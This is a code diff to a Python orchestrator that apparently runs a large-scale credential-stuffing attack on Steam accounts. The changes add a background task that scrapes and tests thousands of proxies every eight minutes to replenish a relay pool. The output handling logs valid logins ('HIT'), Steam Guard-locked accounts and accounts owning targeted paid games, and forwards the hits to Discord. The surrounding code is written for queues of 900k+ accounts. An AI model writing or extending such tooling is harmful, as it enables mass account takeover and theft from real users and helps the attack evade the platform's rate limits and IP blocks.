@@ -227,6 +227,30 @@ class HeadlessOrchestrator:
                 )
             )
 
+        # Start continuous background proxy top-up (scrapes fresh proxies every 8 minutes)
+        async def _bg_proxy_topup():
+            """Background task: every 8 min scrapes + filters fresh proxies into the pool."""
+            while self._is_running:
+                await asyncio.sleep(480)  # 8 minutes
+                if not self._is_running:
+                    break
+                if getattr(self, "_is_scraping", False):
+                    continue
+                self._is_scraping = True
+                try:
+                    raw = await scrape_fresh_proxies(max_relays=5000)
+                    if raw:
+                        tested = await filter_operational_proxies(raw, concurrency=200, timeout_sec=3, save_to_file=True)
+                        if tested:
+                            added = self.relay_pool.append_relays(tested)
+                            print(f"\n\033[96m[BG PROXY] Periodic top-up: +{added} new relays. Pool: {self.relay_pool.active_count}\033[0m")
+                except Exception:
+                    pass
+                finally:
+                    self._is_scraping = False
+
+        self._bg_proxy_task = asyncio.create_task(_bg_proxy_topup())
+
         # Bounded Queue (Memory-optimized for 900k+ accounts)
         queue: asyncio.Queue = asyncio.Queue(maxsize=max(2000, self.concurrency * 50))
         semaphore = asyncio.Semaphore(self.concurrency)
@@ -294,6 +318,14 @@ class HeadlessOrchestrator:
             self._watchdog_task.cancel()
             try:
                 await self._watchdog_task
+            except asyncio.CancelledError:
+                pass
+        # Cancel background periodic proxy top-up
+        bg_task = getattr(self, "_bg_proxy_task", None)
+        if bg_task:
+            bg_task.cancel()
+            try:
+                await bg_task
             except asyncio.CancelledError:
                 pass
 
@@ -680,29 +712,33 @@ class HeadlessOrchestrator:
                     result["matched_targets"] = matched_targets
 
                 # ── Outcomes ──────────────────────────────────────────────────
+                paid_g = result.get("paid_games", 0)
+
                 if status == "HIT":
                     self.hit_count += 1
                     self.exporter.record_item_live(result)
 
                     if is_target:
                         self.target_hit_count += 1
-                        matched_names = ", ".join([tg.get("name", "") for tg in matched_targets[:3]])
+                        m_names = ", ".join([tg.get("name", "") for tg in matched_targets[:3]])
                         if len(matched_targets) > 3:
-                            matched_names += f" +{len(matched_targets)-3} more"
-                        print(f"\n\033[1;32m[TARGET HIT] {username} | Matched: [{matched_names}] | Paid: {result.get('paid_games', 0)}\033[0m")
+                            m_names += f" +{len(matched_targets)-3}"
+                        print(f"\n\033[1;32m[TARGET] {username} | [{m_names}] | Paid:{paid_g}\033[0m")
                         self.exporter.record_target_hit(result, matched_targets)
                     else:
-                        print(f"\n\033[1;34m[HIT] {username} | Paid Games: {result.get('paid_games', 0)}\033[0m")
+                        if paid_g > 0:
+                            print(f"\n\033[1;34m[HIT] {username} | Paid:{paid_g}\033[0m")
+                        # Free-only hits still get logged but silently (no console spam)
 
-                    # Send ALL hits to Discord — every valid login is valuable
+                    # dispatch_hit() internally filters free-only accounts
                     if self.dispatcher:
                         await self.dispatcher.dispatch_hit(result)
 
                 elif status == "2FA_HIT":
                     self.two_fa_count += 1
-                    print(f"\n\033[1;33m[2FA] {username} | Steam Guard Locked | Games: {result.get('total_games', 0)}\033[0m")
+                    print(f"\n\033[1;33m[2FA] {username} | Games:{result.get('total_games',0)}\033[0m")
                     self.exporter.record_item_live(result)
-                    # Send 2FA hits to Discord too — account is valid, just Steam Guard locked
+                    # 2FA: also dispatch (may have paid games from metadata seed)
                     if self.dispatcher:
                         await self.dispatcher.dispatch_hit(result)
 
@@ -711,6 +747,7 @@ class HeadlessOrchestrator:
                 else:
                     self.error_count += 1
                 # ─────────────────────────────────────────────────────────────
+
 
                 # Checkpoint save
                 if self.checked_count % 50 == 0:
